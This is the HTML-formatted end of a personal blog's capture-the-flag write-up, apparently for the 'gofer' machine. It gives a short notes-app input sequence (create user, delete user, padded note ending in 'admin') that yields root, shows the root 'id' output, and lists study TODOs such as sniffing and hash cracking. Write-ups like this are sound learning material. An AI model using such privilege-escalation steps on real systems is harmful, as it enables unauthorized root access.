</span></span></code></pre></div><p>notes app:</p><ol><li>create user</li><li>delete user</li><li>create note: AAAAAAAAAAAAAAAAAAAAAAAAadmin</li></ol><p>then rooted</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>root@gofer:~# id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=0(root) <span style=color:#fb660a>gid</span>=0(root) <span style=color:#fb660a>groups</span>=0(root),1002(tbuckley),1004(dev)
</span></span><span style=display:flex><span>root@gofer:~#
</span></span></code></pre></div><h2 id=todos>TODOs
<a class=heading-link href=#todos><i class="fa fa-link" aria-hidden=true></i></a></h2><ul><li>tcpdump sniffing</li><li>crack httpasswd</li><li>ip address encoding</li><li>url encoding</li><li>email template/headers</li><li>gopher protocol/proxy</li><li>reversing elf skills needed (Ghidra, radare2, frida, ida pro)</li></ul></article></section></div><footer class=footer><section class=container>©
2021 -
2024
Dennis Ruiz
·
Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js integrity="sha256-I2BJOV3DaC+ycZZAhylY4S8fJAZ7sJwyeyM+YpDH7aw="></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-6CQZY8W0WD"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6CQZY8W0WD")</script><script>$(document).on("input propertychange paste change",".FilterSearch",function(){var n=$(this).val().toLowerCase(),s=$(this).closest("ul"),t=s.find("li:gt(0)");t.hide(),t.filter(function(){var e=$(this).text().toLowerCase();return e.indexOf(n)>=0}).show()})</script></body></html>